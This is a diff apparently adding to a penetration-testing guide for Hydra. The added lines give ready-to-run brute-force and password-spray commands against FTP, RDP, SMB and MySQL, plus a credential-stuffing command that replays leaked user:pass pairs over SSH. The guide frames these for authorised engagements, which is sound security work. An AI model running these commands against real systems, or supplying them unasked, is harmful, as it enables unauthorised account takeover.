@@ -50,6 +50,21 @@ hydra -L users.txt -P passwords.txt HOST \
   http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
 ```
 
+Other services take the same shape, just swap the module:
+
+```bash
+hydra -l admin -P passwords.txt ftp://HOST
+hydra -L users.txt -p 'Welcome1' rdp://HOST        # keep -t low; RDP dislikes parallelism
+hydra -L users.txt -p 'Welcome1' smb://HOST        # falls back to Metasploit smb_login for SMBv3
+hydra -L users.txt -P passwords.txt mysql://HOST
+```
+
+Credential stuffing: replay `user:pass` pairs leaked elsewhere with `-C` (one pair per line, instead of separate `-L`/`-P`):
+
+```bash
+hydra -C user_pass.txt ssh://HOST
+```
+
 ## Workflow
 
 1. Confirm the service and any lockout policy: a spray that locks every account fails the engagement goal.
